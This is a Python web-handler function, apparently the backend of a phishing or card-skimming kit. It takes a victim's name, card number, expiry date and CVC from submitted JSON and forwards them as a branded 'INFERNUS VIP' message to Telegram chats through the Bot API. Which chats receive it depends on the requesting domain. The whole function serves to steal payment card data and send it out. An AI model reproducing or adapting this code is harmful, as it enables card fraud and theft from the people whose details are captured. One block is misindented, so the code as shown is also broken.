def recibir_datos():
    data = request.json
    lista_ids_html = data.get('lista_ids', [])
    origen = request.headers.get('Origin', '').split('/')[2] 

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

  mensaje = (
    f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n"
    f"   🔥 INFERNUS VIP 🔥\n"
    f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n\n"
    f"`{tarjeta}`\n"
    f"`{expiracion}`  |  `{cvc}`\n\n"
    f"_{nombre}_"
)

    # SI ES EL DOMINIO DEL GRUPO: Enviar solo una vez al grupo
    if origen == DOMINIO_GRUPO:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ID_GRUPO_DESTINO, "text": mensaje, "parse_mode": "Markdown"}
        
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200:
                return jsonify({"status": "success", "enviados": 1}), 200
        except Exception as e:
            print(f"❌ ERROR: {e}")
        
        return jsonify({"status": "error"}), 500

    # SI ES OTRO DOMINIO: Enviar a los IDs privados normalmente
    exitos = 0
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]
    
    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()
        if id_limpio in lista_maestra_strings:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_limpio, "text": mensaje, "parse_mode": "Markdown"}
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
            except Exception as e:
                print(f"❌ ERROR: {e}")

    return jsonify({"status": "success", "enviados": exitos}), 200
